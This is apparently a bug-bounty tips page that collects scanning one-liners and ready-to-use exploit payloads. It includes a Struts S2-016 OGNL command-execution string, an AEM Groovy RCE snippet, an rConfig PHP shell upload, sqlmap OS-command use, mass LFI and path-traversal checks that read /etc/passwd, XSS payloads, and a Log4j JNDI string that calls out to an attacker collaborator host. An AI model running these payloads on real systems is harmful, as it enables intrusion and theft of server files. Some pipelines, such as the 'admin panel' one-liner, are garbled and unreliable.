Thanks to @ibra0963 for collecting the tips.
 

https://twitter.com/Alra3ees/status/1419058927422017540

The easiest RCE i have found on zerocpter so far:-

```

httpx -l hosts.txt -path "/_fragment?_path=_controller=phpcredits&flag=-1" -threads 100 -random-agent -x GET -tech-detect -status-code -follow-redirects -title -mc 200 -match-regex "PHP Credits"

``
Save this symfony endpoint in your wordlist and run httpx:-

```

/app_dev.php/1'%20%22 -> SQLi

sqlmap -u "https://domain/app_dev.php/1*" --level 4 --risk 2 --dbms="MySQL" --random-agent --force-ssl --hostname --dbs

/app_dev.php -> php info
/_fragment?_path=_controller=phpcredits&flag=-1 -> RCE



httpx -l hosts.txt -path "/_fragment?_path=_controller=phpcredits&flag=-1" -threads 100 -random-agent -x GET -tech-detect -status-code -follow-redirects -title -mc 200 -match-regex "PHP Credits"

Tip: error -> try to put the -path value in " "
[https://www.ambionics.io/blog/symfony-secret-fragment]

```
Little gift my friend On Symfony try these end:

```

/app_dev.php/1'%20"

SQL Injection 90% 

Should reserve an error

```

Easy 4 digits:

```

-Find SharePoint Exposed Web Services[?wsdl] File 

-Search for [DataServices.asmx] 

-Try to use the requests to get data . 

-Scan for SQL Injection 

```


Search for company IPs on shodan and scan them via nuclei:-

```

Install shodan and Add your api key 

shodan init <api key> 

Run:- 

shodan search org:"google" --fields ip_str,port --separator " " | awk '{print $1":"$2}' | httprobe | nuclei -c 100 -t nuclei-templates/

```

Easy money on your free time:- 

```

	Download:- https://github.com/joaomatosf/jexboss

	git clone https://github.com/joaomatosf/jexboss

	cd jexboss 

	pip3 install -r requires.txt 

	Run:- python3 jexboss.py -mode file-scan -file hosts.txt -out report_file_scan.log 

	Good luck!



```

Search for company ips on shodan and scan them via nuclei:-

```

1:- Install shodan pip3 install shodan

2:- Add your api key shodan init <api key>

3:- Install httprobe and nuclei

Run:-

shodan search org:"google" --fields ip_str,port --separator " " | awk '{print $1":"$2}' | httprobe | nuclei -c 100 -t /root/nuclei-templates/

```

Scan Apple ASN for vulnerabilities and leave no port:-

[https://github.com/emadshanab/Scan-Apple-ASN-for-vulnerabilities-and-leave-no-port]

A complete guide to dir brute force,admin panel and API endpoints:-

https://github.com/emadshanab/Acomplete-guide-to-dir-brute-force-admin-panel-and-API-endpoints

``

ppfuzz v1 released! Now, if it's indeed vulnerable:

it'll fingerprinting the script gadgets used and then display additional payload info that could potentially escalate its impact to XSS, bypass/cookie injection. Bump now! — [https://github.com/dwisiswant0/ppfuzz]

``

In your recon process you can find a critical vulnerability like RCE very easy if you have found this dir 

```

/sm/login/loginpagecontentgrabber.do:-

```

I have found a Remote Command Execution ( Apache Struts S2-016) on one of bugcrowd private programs and earned the full bounty of $3000.

```

Just use this oneliner to test for Struts S2-016 on all the hosts.

You just need httpx to run this test.

[https://github.com/projectdiscovery/httpx](https://github.com/projectdiscovery/httpx?fbclid=IwAR0iWG0kIwliGEqFCKpEv864bjk-O_BQ-1QB7VWfpwykiQpapViBmSX3FJ4)

httpx -l hosts.txt -path /sm/login/loginpagecontentgrabber.do -threads 100 -random-agent -x GET,POST,PUT -title -tech-detect -status-code -follow-redirects -title -mc 200

```

If you get /sm/login/loginpagecontentgrabber.do just inject this line on the url:-

```

?redirect%3a${%23a%3d(new+java.lang.ProcessBuilder(new+java.lang.String[]{"cat","/etc/passwd"})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew+java.io.InputStreamReader(%23b),%23d%3dnew+java.io.BufferedReader(%23c),%23e%3dnew+char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}

```

If you see the etc/passwd on the browser then congratulations you get a RCE vulnerability and you will earn the full bounty.

Ref:-

[https://cwiki.apache.org/confluence/display/WW/S2-016](https://cwiki.apache.org/confluence/display/WW/S2-016?fbclid=IwAR3v1OVR0-ID74MbVZ0aRbFUXwIJdAH_kTyL91Ujsckc4ZDvtnylr6QBgJE)

PS:- Work smarter not harder.


[Multi_tools_subdomains]

(https://github.com/emadshanab/Multi_tools_subdomains)



Add /api/.env to wordlist,maybe you will have access to dotenv file environment that leading to exposing symfony APP_SECRET and MAILER_DSN password

httpx:-

```

httpx -l hosts -path /api/.env -threads 100 -random-agent -x GET,POST -tech-detect -status-code -follow-redirects -title -match-regex "APP_SECRET"

```


Add /dbconsole/ to wordlist,

maybe you will access to Grails database admin console (H2 Console) like i did today.

``



If you are free,get some easy monay

aem querybuilder internal path read

- Find AEM:-

[https://github.com/0ang3el/aem-hacker]

```

python3 aem_discoverer.py --file urls.txt -> urls.txt contains subdomain

```

- scan dir:-

[https://github.com/Raz0r/aemscan]

aemscan aem_url

- wordlist:-

[https://github.com/emadshanab/Adobe-Experience-Manager]

```

nuclei -l hosts -tags AEM -t /root/nuclei-templates

```

- Quick test all the hosts for Adobe Experience Manager (AEM) paths via

Wordlist: https://github.com/emadshanab/Adobe-Experience-Manager

```

httpx -l allhosts -paths /root/aem-paths.txt -threads 100 -random-agent -x GET,POST -tech-detect -status-code -follow-redirects -title -mc 200

```



Quick test all the hosts for LFI via @pdiscoveryio httpx:-``

[https://github.com/hussein98d/LFI-files]

```

httpx -l allhosts -paths /root/list.txt -threads 100 -random-agent -x GET,POST,PUT -title -tech-detect -status-code -follow-redirects -title -mc 200 -match-regex "root:[x*]:0:0:"

```

From archive:-

```

cat allhosts | gauplus -t 100 --random-agent -o result.txt ;cat result.txt| gf lfi >> lfi.txt ; httpx -l lfi.txt -paths /root/lfi_wordlist.txt -threads 100 -random-agent -x GET,POST,PUT -tech-detect -status-code -follow-redirects -title -mc 200 -match-regex "root:[x*]:0:0:"

```



Blind XSS at scale 

```

cat domains.txt | waybackurls | httpx -H "User-Agent: \"><script src=$YOUR_XSS_HUNTER></script>"

```



```

site:target.com inurl:"contact" | inurl:"contact-us" | inurl:"contactus" | inurl:"contcat_us" | inurl:"contact_form" | inurl:"contact-form"

```

fill html code in username and xsshunter in the message





AEM:

	/api.json

	/etc/groovyconsole.html -> RCE with the below code

		```

			def sout = new StringBuffer(), serr = new StringBuffer()

			def proc = 'cat /etc/passwd'.execute()

			proc.consumProcessOutput(sout,serr)

			proc.waitForOrKill(1000)

			println "out> $sout err> $serr"

		```



	

For XSS:

	Content-Type:application/json -> Content-Type:text/xss





LFI at SCALE:

```

cat hosts | gau | gf lfi | httpx -paths lfi_wordlist.txt -threads 100 -random-agent -x GET,POST -tech-detect -status-code -follow-redirects -mc 200 -mr "root:[x*]:0:0:"

```



```

cat hosts | httpx -nc -t 300 -p 80,443,8080,8443,8888,8088 -path "/jobmanager/logs/..%252f..%252f..%252f......%252f..%252fetc%252fpasswd" -mr "root:x" -silent

```



```

cat hosts | httpx -nc -t 250 -p 80,443,8080,8443,4443,8888 -path "///////../../../etc/passwd" -mr "root:x" | anew myP1s.txt

```



VMware vCenter (7.0.2.00100):

```

cat target.txt| while read host do;do curl --insecure --path-as-is -s "$host/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file:///etc/passwd"| grep "root:x" && echo "$host Vulnerable";done

```



CVE-2021-41277:

```

cat targets.txt| while read host do;do curl --silent --insecure --path-as-is "$host/api/geojson?url=file:///etc/passwd" | grep -qs "root:x" && echo "$host \033[0;31m Vulnerable";done

```



```

httpx -l IPlist.txt -follow-redirects -title -path /api/geojson?url=file:///etc/passwd -match-string "root:x:0:0"

```



```

ffuf -c -w live.txt -u FUZZ/api/geojson?url=file:///etc/passwd -mr "root:x:0" -t 500

```



```

echo "[http://site.com](https://t.co/6jKKc48dKf)" | httpx | nuclei -t nuclei-templates/cves/2021/CVE-2021-41277.yaml

```

	

Payloads:

```

/v1/docs//..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\/etc/passwd

```







Find PUT method enable:

```

cat targets.txt | assetfinder -subs-only | httpx -silent -p 80,443,8080,8443,9000,9001,9002,9003 -nc | nuclei -t severity high -silent | tee -a BugsFound.txt

```





Find XSS:

```

cat hosts | httpx -nc -t 300 -p 80,443,8080,8443 -silent -path "/?name={{this.constructor.constructor('alert(\"foo\")')()}}" -mr "name={{this.constructor.constructor('alert("

```



```

cat hosts.txt | ffuf -w - -u "FUZZ/sign-in?next=javascript:alert(1);" -mr "javascript:alert(1)"

```



```

waybackurls [http://testphp.vulnweb.com](https://t.co/94lROe3O9p) | urldedupe -qs | bhedak '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'

```



```

add http://brutelogic.com.br/poc.svg to the end of any endpoint

```



```

Change Content-type to image/svg-xml and add your payload

```



```

waybackurls target.com | grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done

```



Find File read (CVE-2021-26085):

```

cat hosts | httpx -nc -t 300 -p 80,443,8080,8443 -silent -path "/s/123cfx/_/;/WEB-INF/classes/seraph-config.xml" -mc 200

```





Find Jenkins Instance with Shodan:

```

ssl:target 200 http.title:"Dashboard [Jenkins]"

payload: "ls /".execute().text

```





rConfig 3.9.6 Shell Upload:

```

	1. Login the rConfig application with your credentials.

	2. request POST with payload <?php echo $_GET["cmd"];?> 

	3. http(s)://<SERVER>/images/vendor/file.php?cmd=id The `id` command will execute on server.

```





Find Information Disclosure:

```

ssl.cert.subject.CN:"*.target.com" 200 http.title:"index"

```



```

cat hosts.txt | httpx -c -silent -path "/wp-content/mysql.sql" -mc 200 -t 250 -p 80,443,8080,8443 | anew myP1s.txt

```





VERY IMPORTANT TOOLS:

	https://github.com/ameenmaali/urldedupe

	https://github.com/six2dez/reconftw

	https://github.com/Sh1Yo/x8

	https://github.com/luke-goddard/LFI-Fuzzer-Burp-Suite

	

Nuclei-Templates:

	https://github.com/emadshanab/Nuclei-Templates-Collection

	

Crt.sh - httpx - nuclei:

	crt.sh target.com | httpx | nuclei



One-liner-bug-bounty:

	https://github.com/KingOfBugbounty/KingOfBugBountyTips/

	https://github.com/Krishnathakur063/OneLiner_BugBounty

	https://github.com/0xlittleboy/One-Liner-Scripts

	https://github.com/notmarshmllow/Bug-Hunting-With-Bash

	

Bug Bounty Methodology:

	https://github.com/ManasHarsh/Bug-bounty-methodology

	https://github.com/JakobTheDev/bug-bounty

	https://github.com/blackhatethicalhacking/bugbountytools-methodology

	https://github.com/0x4rk0/Methodology

	https://github.com/BugBountyResources/Resources

	https://github.com/ajuachu94/Bug-Bounty-Methodology

	https://github.com/h33raj/Bug-Bounty-Methodology

	https://github.com/naufalan/Web-App-Methodology

	https://github.com/oneplus-x/The-Bug-Hunters-Methodology



Mindmaps:

	https://gowthams.gitbook.io/bughunter-handbook/mindmaps

	https://github.com/imran-parray/Mind-Maps

	https://awesomeopensource.com/projects/mindmap

	https://github.com/5bhuv4n35h/pentestmindmap

	https://github.com/topics/mindmap







Find SSRF:

	1:- Download https://github.com/lutfumertceylan/top25-parameter/blob/master/ssrf-parameters.txt

	2:- Add http://brutelogic.com.br/poc.svg on {target} 

	3:- Run httpx: httpx -paths ssrf-parameters.txt -threads 200 -o ssrf.txt 

	4:- Screenshot the result: gowitness file -f ssrf.txt

	-> If the website is vulnerabile it will make a request to the svg.poc and rendering the domain name. SSRF to XSS

```

findomain -t DOMAIN -q | httpx -silent -threads 1000 | gau | grep "=" | qsreplace http://YOUR.burpcollaborator.net

```



SSRF to RCE:

https://twitter.com/e11i0t_4lders0n/status/1473640106741284866







Log4j - RCE: (Search for bypasses)

```

cat hosts.txt | sed 's/https\?:\/\///' | xargs -I {} echo '{}/${jndi:ldap://{}.attacker.burpcollaborator.net}' >> log4j.txt

httpx -l log4j.txt 

```

Look for callbacks in your server. It should be VICTIM.ATTACKER.burpcollab







Find hidden params in javascript files 

```

assetfinder target.com | gau | egrep -v '(.css|.svg)' | while read url; do vars=$(curl -s [$url](https://twitter.com/search?q=%24url&src=cashtag_click) | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"

```



```

cat subdomains.txt | gauplus -subs -t 100 -random-agent | sort -u --version-sort | httpx -silent -threads 2000 | grep -Eiv '(.eot|.jpg|.jpeg|.gif|.css|.tif|.tiff|.png|.ttf|.otf|.woff|.woff2|.ico|.svg|.txt|.pdf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -Eiv '\.js$|([^.]+)\.js|([^.]+)\.js\.[0-9]+$|([^.]+)\.js[0-9]+$|([^.]+)\.js[a-z][A-Z][0-9]+$' | sed 's/.*/&=FUZZ/g'); echo -e "\e[1;33m$url\e[1;32m$vars";done

```







SQLi:

	RCE:

```

sqlmap -r request.txt --force-ssl -p pramater --level 5 --risk 2 -dbms="Microsoft SQL Server" --os-cmd="ping http://your.burpcollaborator.net"

```





Github Recon:

	take a look and check:

	target.okta.com password 

	target.onelogin.com password 

	target.service-now password 

	target.atlassian.net password 

	target.jfrog.io password 

	target.sharepoint.com password





Zabbie dashboard without authentication:

```

/zabbix/zabbix.php?action=dashboard.list

```





RCE:

https://twitter.com/Alra3ees/status/1416185619336814596:

```

httpx -l hosts.txt -path /sm/login/loginpagecontentgrabber.do -threads 100 -random-agent -x GET -title -tech-detect -status-code -follow-redirects -title -mc 200

```





5min admin panel accessed payLoda:

```

cat urls.txt | qsreplace "?admin=true" | gau | phpgcc | anew | kxss | awk -v -q txt | sed 's/http/\nhttp/g' | grep ^http | sed 's/\(^http[^ <]*\)\(.*\)/\1/g' | grep -vi -e dalfox -e lElLxtainw| sort -u | waybackurls

```


postMessage() Vulnerabilities

https://twitter.com/Alra3ees/status/1527029184517885954



SpringScan Burp detection plugin:-

https://twitter.com/Alra3ees/status/1525827005564039171



JSON Injection:

https://twitter.com/M0Hacks/status/1524313916368642050



More Subs:

https://twitter.com/Alra3ees/status/1426674895803531266





Other Accounts:

https://twitter.com/_bughunter

https://twitter.com/YogoshaOfficial

https://twitter.com/wugeej
